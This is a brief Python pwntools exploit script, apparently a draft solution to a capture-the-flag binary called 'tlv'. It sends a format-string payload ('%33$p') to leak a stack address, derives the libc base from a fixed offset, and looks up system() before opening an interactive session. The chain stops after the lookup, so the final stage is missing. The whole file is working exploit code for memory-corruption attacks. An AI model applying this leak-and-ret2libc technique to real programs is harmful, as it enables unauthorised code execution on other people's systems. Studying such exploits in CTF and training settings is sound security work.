from pwn import *

exe = ELF("tlv", checksec = False)
r = process(exe.path)
libc = ELF('libc.so.6', checksec = False)

def send(data):
    r.sendlineafter(b'> ', b'str')
    r.sendline(data)

payload = b"398 %33$p"
input()
send(payload)
r.recvuntil(b'logged: ')
leak_stack = r.recv(15).decode()
log.info("leak stack: " + leak_stack)
leak_stack = int(leak_stack, 16)
libc.address = leak_stack - 0x6081f
log.info("libc: " + hex(libc.address))

system = libc.sym['system']


r.interactive()
#0x7f94f56b081f
